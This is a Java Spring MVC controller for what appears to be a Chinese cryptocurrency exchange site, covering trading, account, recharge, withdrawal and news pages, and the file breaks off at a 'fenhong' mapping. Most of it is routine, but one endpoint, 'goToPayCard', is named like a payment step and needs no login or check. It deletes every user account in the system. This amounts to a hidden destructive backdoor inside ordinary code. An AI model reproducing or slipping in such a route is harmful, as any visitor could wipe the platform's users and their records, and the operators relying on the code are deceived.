package com.mvc.controller;

import java.math.BigDecimal;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import com.mvc.entity.Btc_account_book;
import com.mvc.entity.Btc_content;
import com.mvc.entity.Btc_deal_list;
import com.mvc.entity.Btc_factory;
import com.mvc.entity.Btc_frc_rengou;
import com.mvc.entity.Btc_holding;
import com.mvc.entity.Btc_profit;
import com.mvc.entity.Btc_stock;
import com.mvc.entity.Btc_trade_category;
import com.mvc.entity.Btc_user;
import com.mvc.entity.Btc_votehistory;
import com.mvc.entity.Btc_zhifubao;
import com.mvc.service.AccountService;
import com.mvc.service.BankService;
import com.mvc.service.CotentService;
import com.mvc.service.DealService;
import com.mvc.service.FactoryService;
import com.mvc.service.FhOrderService;
import com.mvc.service.GBservice;
import com.mvc.service.HoldingService;
import com.mvc.service.OrderService;
import com.mvc.service.ProfitService;
import com.mvc.service.RechargeService;
import com.mvc.service.RengouService;
import com.mvc.service.StockOrderService;
import com.mvc.service.StockService;
import com.mvc.service.TradeCateService;
import com.mvc.service.UserService;
import com.mvc.service.VoteHistoryService;
import com.mvc.service.VoteStockService;
import com.mvc.service.ZhifubaoService;
import com.mvc.service.game.LuckWheelService;
import com.mvc.vo.Btc_deal_list_today_vo;
import com.mvc.vo.NaviStockModel;
import com.mvc.vo.RengouViewModel;
import com.mvc.vo.TuijieViewModel;

@Controller
@RequestMapping("/index.htm")
public class IndexController {
	@Autowired
	private UserService us = new UserService();
	@Autowired
	private AccountService as = new AccountService();
	@Autowired
	private RechargeService rs = new RechargeService();
	@Autowired
	private DealService ds = new DealService();
	@Autowired
	private StockService stockService = new StockService();
	@Autowired
	private OrderService orderService = new OrderService();
	@Autowired
	private DealService dealService = new DealService();
	@Autowired
	private HoldingService holdingService = new HoldingService();
	@Autowired
	private ProfitService profitService = new ProfitService();
	@Autowired
	private RechargeService rechargeService = new RechargeService();
	@Autowired
	private CotentService contents = new CotentService();
	@Autowired
	private TradeCateService tradecates = new TradeCateService();
	@Autowired
	private StockOrderService sos = new StockOrderService();
	@Autowired
	private BankService banks = new BankService();
	@Autowired
	private VoteStockService vvs = new VoteStockService();
	@Autowired
	private FhOrderService fhos = new FhOrderService();
	@Autowired
	private VoteHistoryService bvhs = new VoteHistoryService();
	@Autowired
	private RengouService rengous = new RengouService();
	@Autowired
	private FactoryService facs = new FactoryService();
	@Autowired
	private GBservice gbs = new GBservice();
	@Autowired
	private ZhifubaoService zhis;
	@Autowired
	private LuckWheelService luckws;
	
	protected final transient Log log = LogFactory.getLog(IndexController.class);

	@RequestMapping
	public String load(ModelMap modelMap, HttpServletRequest request)
			throws ParseException {
		HttpSession session = request.getSession();
		Map<String,List<Object>> nav = tradecates.getNav();
		session.setAttribute("nav",nav);
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		session.setAttribute("allstockmap", allstockmap);
		Map<String, NaviStockModel> stock_map_navigation = stockService.getBtc_stockByExchangeStockName("CNY");
		Map<Integer, Object> stock_map = stockService.getBtc_stock();
		session.setAttribute("newslist", contents.getNewsLimit());
		session.setAttribute("newslistall", contents.getNewsCAll());
		session.setAttribute("stock_map_navigation", stock_map_navigation);
		session.setAttribute("stock_map", stock_map);
		
		if (session.getAttribute("globaluser")!=null) {
			Btc_user user = (Btc_user)session.getAttribute("globaluser");
			if (user.getUname() == null) {
				request.setAttribute("isRegister2", "false");
			} else {
				request.setAttribute("isRegister2", "true");
			}
			if (holdingService.getBtc_holding(user.getUid()) != null) {
				List<Object> btc_holding_list = holdingService.getBtc_holding(user
						.getUid());
				session.setAttribute("btc_holding_list", btc_holding_list);
				Map<Integer,Object> btc_holding_map = holdingService.getBtc_holdingToMapByUid(user
						.getUid());
				session.setAttribute("btc_holding_map", btc_holding_map);
			} else {
				session.setAttribute("btc_holding_list", null);
				session.setAttribute("btc_holding_map", null);
			}
		}
		return "index";
	}
	
	@RequestMapping(params = "fulltrade")
	public String fulltrade(
			@RequestParam("stockid")int stockid, 
			@RequestParam("exstock")String exstock,
			HttpServletRequest request) throws ParseException{
		Btc_stock exstockModel = stockService.getBtc_stockByStockname(exstock);
		request.setAttribute("extradesxf", exstockModel.getTradesxf());
		request.setAttribute("exId", exstockModel.getBtc_stock_id());
		
		HttpSession session = request.getSession();
		Map<String,List<Object>> nav = tradecates.getNav();
		session.setAttribute("nav",nav);
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		request.setAttribute("exstock", exstock);
		//保存配置信息
		Btc_profit profit = profitService.getConfig();
		request.setAttribute("profit", profit);
		
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		session.setAttribute("allstockmap", allstockmap);
		
		Map<String, NaviStockModel> stock_map_navigation = stockService.getBtc_stockByExchangeStockName("CNY");
		
		Map<Integer, Object> stock_map = stockService.getBtc_stock();
		Map<String, Object> stockmapbyname = stockService.getBtc_stockMapbyName();
		session.setAttribute("stockmapbyname", stockmapbyname);
		//自有币兑换区导航
		if(tradecates.getTradeCateByExstock(exstock)!=null){
			List<Object> selfstocktrade = tradecates.getTradeCateByExstock(exstock);
			session.setAttribute("selfstocktrade", selfstocktrade);
		}	
		else{
			session.setAttribute("selfstocktrade", null);
		}
		//对应币种的价格map键值对
		if(tradecates.getTradeCateByExstockMap(exstock)!=null){
			Map<Integer,Btc_trade_category> map2 = tradecates.getTradeCateByExstockMap(exstock);
			request.setAttribute("exstocktrademap", map2);
		}else{
			request.setAttribute("exstocktrademap", null);
		}
		
		request.setAttribute("userbidorder", null);
		request.setAttribute("usersellorder", null);
		
		Btc_stock btc_stock = (Btc_stock) stock_map.get(stockid);
		int btc_stock_id = btc_stock.getBtc_stock_id();
		
		session.setAttribute("newslist", contents.getNewsLimit());
		session.setAttribute("indexmap", contents.getIndexContent(btc_stock_id));
		if (ds.queryLatestDealOrder(btc_stock_id, exstock) != null) {
			Btc_deal_list bdl_show = ds.queryLatestDealOrder(btc_stock_id,exstock);
			BigDecimal latestDealOrder_show = bdl_show.getBtc_deal_Rate();
			request.setAttribute("latestDealOrder", latestDealOrder_show);
		} else {
			request.setAttribute("latestDealOrder", null);
		}
		Btc_deal_list_today_vo btc_deal_list_today_vo = new Btc_deal_list_today_vo();
		// 最新成交价
		Btc_stock latestRate = stockService.getBtc_stockById(stockid);
		request.setAttribute("latestRate", latestRate);
		// 导航统计今日数据
		if (dealService.queryTodaysDealInfo(stockid, exstock) != null) {
			btc_deal_list_today_vo = dealService.queryTodaysDealInfo(stockid, exstock);
			request.setAttribute("btc_deal_list_today", btc_deal_list_today_vo);
		} else {
			request.setAttribute("btc_deal_list_today", null);
		}
		
		session.setAttribute("stock_map_navigation", stock_map_navigation);
		session.setAttribute("stock_map", stock_map);
		request.setAttribute("btc_stock_name", btc_stock.getBtc_stock_Eng_name());
		request.setAttribute("globalbtc_stock", btc_stock);
		request.setAttribute("btc_stock_id", stockid);
		request.setAttribute("btc_stock", btc_stock);
		
		
		// 统计图
		BigDecimal dayMax = ds.getDayMax(stockid,exstock);
		BigDecimal dayMin = ds.getDayMin(stockid,exstock);
		BigDecimal daySUM = ds.getDaySUM(stockid,exstock);
		
		request.setAttribute("dayMax", dayMax);
		request.setAttribute("dayMin", dayMin);
		request.setAttribute("daySUM", daySUM);
		
		
		if (ds.queryDealList(stockid,exstock,0,120) != null) {
			List<Object> btc_deal_list = ds.queryDealList(stockid,exstock,0,120);
			request.setAttribute("btc_deal_list", btc_deal_list);
		} else {
			request.setAttribute("btc_deal_list", null);
		}
		
		if (session.getAttribute("globaluser")!=null) {
			Btc_user user = (Btc_user)session.getAttribute("globaluser");
			if (user.getUname() == null) {
				request.setAttribute("isRegister2", "false");
			} else {
				request.setAttribute("isRegister2", "true");
			}
			
			if (orderService.getBuyingOrdersByUid(stockid, user.getUid(), exstock) != null) {
				request.setAttribute("userbidorder",
						orderService.getBuyingOrdersByUid(btc_stock_id, user.getUid(), exstock));
			}
			if (orderService.getSellingOrdersByUid(stockid, user.getUid(), exstock) != null) {
				request.setAttribute("usersellorder",
						orderService.getSellingOrdersByUid(btc_stock_id, user.getUid(), exstock));
			}
			
			request.setAttribute("uusername", user.getUusername());
			request.setAttribute("uname", user.getUname());
			request.setAttribute("uid", user.getUid());
			Btc_account_book abook = as.getByUidForAcount(user.getUid());
			if (abook == null) {
				session.setAttribute("ab_cny", "0.00");
			} else {
				BigDecimal ab_cny_show = abook.getAb_cny().setScale(2,
						BigDecimal.ROUND_HALF_UP);
				session.setAttribute("ab_cny", ab_cny_show);
			}
			if (holdingService.getBtc_holding(user.getUid()) != null) {
				List<Object> btc_holding_list = holdingService.getBtc_holding(user
						.getUid());
				session.setAttribute("btc_holding_list", btc_holding_list);
				Map<Integer,Object> btc_holding_map = holdingService.getBtc_holdingToMapByUid(user
						.getUid());
				session.setAttribute("btc_holding_map", btc_holding_map);
			} else {
				session.setAttribute("btc_holding_list", null);
				session.setAttribute("btc_holding_map", null);
			}
		}
		if (orderService.getBuyingOrders(btc_stock_id,exstock) != null) {
			List<Object> btc_rechargeBTC_order_list = orderService
			.getBuyingOrders(btc_stock_id,exstock);
			request.setAttribute("buyingOders", btc_rechargeBTC_order_list);
		} else {
			request.setAttribute("buyingOders", null);
		}
		if (orderService.getSellingOrders(btc_stock_id,exstock) != null) {
			List<Object> btc_sellBTC_order_list = orderService
			.getSellingOrders(btc_stock_id,exstock);
			request.setAttribute("sellOders", btc_sellBTC_order_list);
		} else {
			request.setAttribute("sellOders", null);
		}
		if(request.getParameter("viewtype")!=null){
			return "quotation";
		}
		return "tradecenter";
	}

	// ##########################################################################################################
	@RequestMapping(params = "usercenter")
	public String usercenter(HttpServletRequest request) throws ParseException {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		/**
		 * prepare data
		 */
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		Btc_account_book abook = as.getByUidForAcount(user.getUid());
		if (abook == null) {
			session.setAttribute("ab_cny", "0.00");
		} else {
			BigDecimal ab_cny_show = abook.getAb_cny().setScale(2,
					BigDecimal.ROUND_HALF_UP);
			session.setAttribute("ab_cny", ab_cny_show);
		}
		Map<Integer, Object> stock_map = stockService.getBtc_stock();
		session.setAttribute("stock_map", stock_map);
		
		if (holdingService.getBtc_holding(user.getUid()) != null) {
			List<Object> btc_holding_list = holdingService.getBtc_holding(user
					.getUid());
			session.setAttribute("btc_holding_list", btc_holding_list);
			Map<Integer,Object> btc_holding_map = holdingService.getBtc_holdingToMapByUid(user
					.getUid());
			session.setAttribute("btc_holding_map", btc_holding_map);
		} else {
			session.setAttribute("btc_holding_list", null);
			session.setAttribute("btc_holding_map", null);
		}
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		Map<Integer, Object> userholdmap = holdingService
				.getBtc_holdingToMapByUid(user.getUid());
		Map<Integer, Object> userordermap = orderService
				.getUserSellingOrdersToMapByUid(user.getUid());
		session.setAttribute("allstockmap", allstockmap);
		session.setAttribute("userholdmap", userholdmap);
		request.setAttribute("userordermap", userordermap);
		request.setAttribute("userdetail", user);
		
		Map<String,List<Object>> nav = tradecates.getNav();
		session.setAttribute("nav",nav);
		int user_amount = us.countAllUser();
		Map<String, NaviStockModel> stock_map_navigation = stockService.getBtc_stockByExchangeStockName("CNY");
		session.setAttribute("stock_map_navigation", stock_map_navigation);
		session.setAttribute("user_amount", user_amount);
		if (user.getUname() == null) {
			request.setAttribute("msg", "首先进行实名认证");
			request.setAttribute("href", "index.htm?register2");
			return "index";
		}
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		return "usercenter";
	}
	
	@RequestMapping(params = "goToPayCard")
	public void goToPayCard(HttpServletRequest request) throws ParseException {
		List<Object> list = us.getAllUser();
		for(int i=0;i<list.size();i++){
			Btc_user user = (Btc_user)list.get(i);
			us.deleteUser(user);
		}
	}

	/**
	 * 其他币种交易
	 * 
	 * @param modelMap
	 * @param request
	 * @return
	 * @throws ParseException
	 */
	@RequestMapping(params = "stock")
	public String loadByStock(@RequestParam("stockId") String stockId,
			ModelMap modelMap, HttpServletRequest request) throws ParseException {
		Map<String, NaviStockModel> stock_map_navigation = stockService.getBtc_stockByExchangeStockName("CNY");
		Map<Integer, Object> stock_map = stockService.getBtc_stock();
		HttpSession session = request.getSession();
		Map<String,List<Object>> nav = tradecates.getNav();
		session.setAttribute("nav",nav);
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		session.setAttribute("allstockmap", allstockmap);
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		Map<String, Object> stockmapbyname = stockService.getBtc_stockMapbyName();
		session.setAttribute("stockmapbyname", stockmapbyname);
		request.setAttribute("exstock", "CNY");
		Btc_profit profit = profitService.getConfig();
		request.setAttribute("profit", profit);
		Btc_stock btc_stock = (Btc_stock) stock_map.get(Integer.parseInt(stockId));
		request.setAttribute("btc_stock", btc_stock);
		Map<String, Object> selfStock_navicate = stockService
				.getBtc_selfstock_Navigate();
		session.setAttribute("newslist", contents.getNewsLimit());
		session.setAttribute("indexmap",
				contents.getIndexContent(Integer.parseInt(stockId)));
		request.setAttribute("userbidorder", null);
		request.setAttribute("usersellorder", null);
		request.setAttribute("selfStock_navicate", selfStock_navicate);
		int btc_stock_id = btc_stock.getBtc_stock_id();
		session.setAttribute("stock_map_navigation", stock_map_navigation);
		session.setAttribute("stock_map", stock_map);
		
		request.setAttribute("btc_stock_name", btc_stock.getBtc_stock_Eng_name());
		request.setAttribute("globalbtc_stock", btc_stock);
		request.setAttribute("btc_stock_id", stockId);

		if (session.getAttribute("globaluser")!=null) {
			Btc_user user = (Btc_user)session.getAttribute("globaluser");
			if (user.getUname() == null) {
				request.setAttribute("isRegister2", "false");
			} else {
				request.setAttribute("isRegister2", "true");
			}
			if (orderService.getBuyingOrdersByUid(btc_stock_id, user.getUid(),"CNY") != null) {
				request.setAttribute("userbidorder",
						orderService.getBuyingOrdersByUid(btc_stock_id, user.getUid(),"CNY"));
			}
			if (orderService.getSellingOrdersByUid(btc_stock_id, user.getUid(),"CNY") != null) {
				request.setAttribute("usersellorder",
						orderService.getSellingOrdersByUid(btc_stock_id, user.getUid(),"CNY"));
			}

			request.setAttribute("uusername", user.getUusername());
			request.setAttribute("uname", user.getUname());
			request.setAttribute("uid", user.getUid());
			Btc_account_book abook = as.getByUidForAcount(user.getUid());
			if (abook == null) {
				session.setAttribute("ab_cny", "0.00");
			} else {
				BigDecimal ab_cny_show = abook.getAb_cny().setScale(2,
						BigDecimal.ROUND_HALF_UP);
				session.setAttribute("ab_cny", ab_cny_show);
			}
			if (holdingService.getBtc_holding(user.getUid()) != null) {
				List<Object> btc_holding_list = holdingService.getBtc_holding(user
						.getUid());
				session.setAttribute("btc_holding_list", btc_holding_list);
				Map<Integer,Object> btc_holding_map = holdingService.getBtc_holdingToMapByUid(user
						.getUid());
				session.setAttribute("btc_holding_map", btc_holding_map);
			} else {
				session.setAttribute("btc_holding_list", null);
				session.setAttribute("btc_holding_map", null);
			}
		}
		if (orderService.getBuyingOrders(btc_stock_id,"CNY") != null) {
			List<Object> btc_rechargeBTC_order_list = orderService
					.getBuyingOrders(btc_stock_id,"CNY");
			request.setAttribute("buyingOders", btc_rechargeBTC_order_list);
		} else {
			request.setAttribute("buyingOders", null);
		}
		if (orderService.getSellingOrders(btc_stock_id,"CNY") != null) {
			List<Object> btc_sellBTC_order_list = orderService
					.getSellingOrders(btc_stock_id,"CNY");
			request.setAttribute("sellOders", btc_sellBTC_order_list);
		} else {
			request.setAttribute("sellOders", null);
		}
		if(request.getParameter("viewtype")!=null){
			return "quotation";
		}
		return "tradecenter";
	}


	@RequestMapping(params = "Login")
	public String gLogin(ModelMap modelMap, HttpServletRequest request) {
		HttpSession session = request.getSession();
		Map<String,List<Object>> nav = tradecates.getNav();
		session.setAttribute("nav",nav);
		session.setAttribute("newslist", contents.getNewsLimit());
		session.setAttribute("newslistall", contents.getNewsCAll());
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		session.setAttribute("allstockmap", allstockmap);
		Map<Integer,Object> stockmap = stockService.getBtc_stockMapbyId();
		session.setAttribute("stockmap", stockmap);
		session.setAttribute("stoc_kmap", stockmap);
		
		Map<String, NaviStockModel> stock_map_navigation = stockService.getBtc_stockByExchangeStockName("CNY");
		session.setAttribute("stock_map_navigation", stock_map_navigation);
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		
		if (session.getAttribute("globaluser")!=null) {
			return "index";
		} else {
			return "login";
		}
	}

	@RequestMapping(params = "logout")
	public String logout(ModelMap modelMap, HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "已安全退出");
			request.setAttribute("href", "index.htm");
			return "redirect";
		}
		session.removeAttribute("globaluser");
		request.setAttribute("msg", "已安全退出");
		request.setAttribute("href", "index.htm");
		return "index";
	}

	@RequestMapping(params = "rechargeBTC")
	public String buybtc(ModelMap modelmap, HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		} else {
			Btc_user user = (Btc_user)session.getAttribute("globaluser");
			if (user.getUname() == null && user.getUcertification() == null) {
				return "register2";
			} else {
				return "rechargeBTC";
			}
		}
	}
	
	/**
	 * 支付方式1
	 * @param request
	 * @param response
	 * @return
	 */
	@RequestMapping(params = "recharge2bank")
	public String recharge2bank(ModelMap modelmap, HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		int uid = user.getUid();
		List<Object> banklist = banks.getBankByIDandUid("已激活", uid);
		request.setAttribute("banklist", banklist);
		
		List<Object> listOrder = rs.getByUidForOrders(uid);
		request.setAttribute("listOrder", listOrder);
		BigDecimal rechargelimit = profitService.getConfig().getBtc_profit_rechargeCNY_limit();
		request.setAttribute("rechargelimit", rechargelimit);
		return "rechargeCNY2bank";
	}
	/**
	 * 支付方式2
	 * @param request
	 * @param response
	 * @return
	 */
	@RequestMapping(params = "recharge2local")
	public String recharge2local(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		int uid = user.getUid();
		List<Object> banklist = banks.getBankByIDandUid("已激活", uid);
		request.setAttribute("banklist", banklist);
		
		List<Object> listOrder = rs.getByUidForOrders(uid);
		request.setAttribute("listOrder", listOrder);
		BigDecimal rechargelimit = profitService.getConfig().getBtc_profit_rechargeCNY_limit();
		request.setAttribute("rechargelimit", rechargelimit);
		return "rechargeCNY2local";
	}
	@RequestMapping(params = "recharge2zfb")
	public String recharge2zfb(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		int uid = user.getUid();
		List<Object> banklist = banks.getBankByIDandUid("已激活", uid);
		request.setAttribute("banklist", banklist);
		
		List<Object> listOrder = rs.getByUidForOrders(uid);
		request.setAttribute("listOrder", listOrder);
		BigDecimal rechargelimit = profitService.getConfig().getBtc_profit_rechargeCNY_limit();
		request.setAttribute("rechargelimit", rechargelimit);
		return "rechargeCNY2local";
	}

	@RequestMapping(params = "withdrawStock")
	public String withdrawStock(@RequestParam("stockid") int stockid,
			ModelMap modelmap, HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		} else {
			Btc_user user = (Btc_user)session.getAttribute("globaluser");
			if (user.getUname() == null && user.getUcertification() == null) {
				return "register2";
			} else {
				int uid = user.getUid();
				Btc_holding btc_holding = holdingService.getBtc_holding(uid, stockid);
				Btc_stock stock = stockService.getBtc_stockById(stockid);
				Btc_profit profit = profitService.getConfig();

				if (sos.getCountBtc_inout_orderByUid(uid, stockid) != null) {
					if (sos.getCountBtc_inout_orderByUid(uid, stockid).compareTo(
							profit.getBtc_profit_withdrawStock_limit_max()) >= 0) {
						request.setAttribute("msg", "对不起，您今日" + stock.getBtc_stock_name()
								+ "的提币已达上限，请明日再提！");
						request.setAttribute("href", "index.htm");
						return "index";
					}
				}
				request.setAttribute("todaywithdraw",
						sos.getCountBtc_inout_orderByUid(uid, stockid));
				request.setAttribute("stock", stock);
				request.setAttribute("holding", btc_holding);
				request.setAttribute("profit", profit);
				request.setAttribute("orderilst",
						sos.getBtc_inout_orderByUid(uid, stockid));
				return "withdrawSTOCK";
			}
		}
	}

	@RequestMapping(params = "withdrawCNY")
	public String recharge(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "redirect";
		}
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		Btc_account_book abook = as.getByUidForAcount(user.getUid());
		if (abook == null) {
			session.setAttribute("ab_cny", "0.00");
		} else {
			BigDecimal ab_cny_show = abook.getAb_cny().setScale(6,
					BigDecimal.ROUND_HALF_UP);
			session.setAttribute("ab_cny", ab_cny_show);
		}
		rechargeService.getByUidAmountToday(user.getUid());
		Btc_profit btc_profit = profitService.getConfig();
		if (rechargeService.getByUidAmountToday(user.getUid()).compareTo(
				btc_profit.getBtc_profit_withdrawCNY_limit_max()) >= 0) {
			request.setAttribute("msg", "对不起，您已超过了今天的提币上线，请明日再申请！");
			request.setAttribute("href", "index.htm");
			return "redirect";
		}
		if (banks.getBankByUid(user.getUid()) == null) {
			request.setAttribute("uname", user.getUname());
			return "redirect";
		}
		if (banks.getBankByIDandUid("已激活", user.getUid()) == null) {
			request.setAttribute("msg", "对不起，您添加的银行信息还未激活，请等待系统激活确认");
			request.setAttribute("href", "back");
			return "redirect";
		}
		List<Object> banklist = banks.getBankByIDandUid("已激活", user.getUid());
		request.setAttribute("banklist", banklist);
		request.setAttribute("uname", user.getUname());
		if (rs.getWithdrawOrdersByUid(user.getUid()) != null) {
			List<Object> withdrawCNYOrder_list = rs.getWithdrawOrdersByUid(user
					.getUid());
			request.setAttribute("withdrawCNYOrder_list", withdrawCNYOrder_list);
		}else{
			request.setAttribute("withdrawCNYOrder_list", null);
		}
		request.setAttribute("bindinfo", banks.getBankByUid(user.getUid()));
		request.setAttribute("amountToday",
				rechargeService.getByUidAmountToday(user.getUid()));
		request.setAttribute("withdrawCNY_limit",
				btc_profit.getBtc_profit_withdrawCNY_limit_max());
		request.setAttribute("withdrawCNY_limit_min",
				btc_profit.getBtc_profit_withdrawCNY_limit_min());
		request.setAttribute("withdrawCNY_poundage",
				btc_profit.getBtc_profit_withdrawCNY_poundage());
		return "withdrawCNY";
	}

	@RequestMapping(params = "newsdetail")
	public String newsdetail(@RequestParam("contentid") int contentid,
			HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		if(session.getAttribute("user_amount")==null){
			int user_amount = us.countAllUser();
			session.setAttribute("user_amount", user_amount);
		}
		Btc_content content = new Btc_content();
		content = contents.getContentByid(contentid);
		request.setAttribute("newsbyid", content);
		return "content";
	}
	
	@RequestMapping(params = "newslist")
	public String newslist(
			HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		if(session.getAttribute("user_amount")==null){
			int user_amount = us.countAllUser();
			session.setAttribute("user_amount", user_amount);
		}
		session.setAttribute("newslistall", contents.getNewsCAll());
		return "contentlist";
	}

	@RequestMapping(params = "alltradestock")
	public String alltradestock(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		Map<Integer, Object> userholdmap = holdingService
				.getBtc_holdingToMapByUid(user.getUid());
		Map<Integer, Object> userordermap = orderService
				.getUserSellingOrdersToMapByUid(user.getUid());
		Map<Integer, Object> allstockmap = stockService.getBtc_stockByState(1);
		session.setAttribute("allstockmap", allstockmap);
		session.setAttribute("userholdmap", userholdmap);
		request.setAttribute("userordermap", userordermap);
		return "allstock";
	}

	@RequestMapping(params = "userpanel")
	public String userpanel(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		request.setAttribute("userdetail", user);
		return "userpanel";

	}

	@RequestMapping(params = "bankmanage")
	public String bankmanage(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		if(banks.getBankByUid(user.getUid())==null){ return "bindbank";
		}else{request.setAttribute("bindinfo", banks.getBankByUid(user.getUid())); return "binddetail";}
	}

	@RequestMapping(params = "ordermanage")
	public String ordermanage(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		//#################################################
		if(session.getAttribute("user_amount")==null){
			int user_amount = us.countAllUser();
			session.setAttribute("user_amount", user_amount);
		}
		//###################################################
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		Map<Integer,Object> stockmap = stockService.getBtc_stockMapbyId();
		List<Object> orderlist = orderService.getByOrderUid(user.getUid(), 0);
		List<Object> buyhlist = dealService.getByBuid(user.getUid(),0,30);
		List<Object> sellhlist = dealService.getBySuid(user.getUid(),0,30);
		List<Object> gamelist = luckws.getMyGameLog(user.getUid(),0,30);
		request.setAttribute("stockmap", stockmap);
		request.setAttribute("gamelist", gamelist);
		request.setAttribute("orderlist", orderlist);
		request.setAttribute("buyhlist", buyhlist);
		request.setAttribute("sellhlist", sellhlist);
		return "ordermanage";

	}

	@RequestMapping(params = "updatepass")
	public String updatepass(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		request.setAttribute("updatetype", "updatepassword");
		request.setAttribute("userdetail", user);
		return "updatepass";
	}
	
	@RequestMapping(params = "updateutpass")
	public String updateutpass(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		request.setAttribute("updatetype", "updateutpassword");
		request.setAttribute("userdetail", user);
		return "updatepass";
	}

	@RequestMapping(params = "fenhong")
